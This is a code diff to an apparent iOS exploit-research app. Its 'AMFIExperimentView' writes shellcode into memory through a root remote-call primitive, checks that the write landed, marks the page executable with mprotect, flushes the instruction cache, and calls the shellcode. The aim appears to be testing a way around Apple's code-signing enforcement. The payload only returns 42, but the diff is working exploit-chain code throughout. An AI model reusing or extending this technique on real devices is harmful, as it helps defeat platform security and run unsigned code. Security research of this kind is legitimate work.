@@ -5902,10 +5902,24 @@ struct AMFIExperimentView: View {
         if mmapA != MAP_FAILED && mmapA != 0 {
             detail += "  ✅ mmap OK\n"
 
-            // Write shellcode
-            sb[mmapA].setValue32(shellcode_mov_x0_42)
-            sb[mmapA + 4].setValue32(shellcode_ret)
-            detail += "  Wrote shellcode (MOV X0,#42 + RET)\n"
+            // Write shellcode via memcpy (sb[addr] mungkin hanya write ke trojanMem)
+            let scBuf = mem + 0x3000
+            sb[scBuf].setValue32(shellcode_mov_x0_42)
+            sb[scBuf + 4].setValue32(shellcode_ret)
+            RootExecutor.rcall(sb, "memcpy", mmapA, scBuf, 8)
+            detail += "  Wrote shellcode via memcpy (MOV X0,#42 + RET)\n"
+
+            // Verify shellcode written
+            let verifBuf = mem + 0x3100
+            RootExecutor.rcall(sb, "memcpy", verifBuf, mmapA, 8)
+            let v0 = sb[verifBuf].value32()
+            let v1 = sb[verifBuf + 4].value32()
+            detail += "  Verify: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"
+            if v0 == shellcode_mov_x0_42 && v1 == shellcode_ret {
+                detail += "  ✅ Shellcode verified in memory!\n"
+            } else {
+                detail += "  ⚠️ Shellcode mismatch — write mungkin gagal\n"
+            }
 
             // mprotect to RX
             let mprotRet = RootExecutor.rcall(sb, "mprotect", mmapA, PAGE_SIZE, PROT_READ | PROT_EXEC)
@@ -5915,8 +5929,20 @@ struct AMFIExperimentView: View {
             if mprotRet == 0 {
                 detail += "  ✅ mprotect(RX) SUCCESS!\n\n"
 
+                // Flush instruction cache — ARM64 has separate I/D caches
+                // Without this, CPU may execute stale zeros instead of our shellcode
+                let RTLD_DEFAULT_A = UInt64(bitPattern: -2)
+                let sysIcacheA = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT_A,
+                                                    remote_alloc_str(sb, "sys_icache_invalidate"))
+                if sysIcacheA != 0 {
+                    RootExecutor.rcallAddr(sb, sysIcacheA, mmapA, PAGE_SIZE)
+                    detail += "  sys_icache_invalidate: OK\n"
+                } else {
+                    // Fallback: __clear_cache or just proceed
+                    detail += "  sys_icache_invalidate: not found (proceed anyway)\n"
+                }
+
                 // Call shellcode as function pointer!
-                // rcallAddr calls a function pointer directly
                 let result = RootExecutor.rcallAddr(sb, mmapA)
                 detail += "  CALL shellcode: ret=\(result)\n"
 
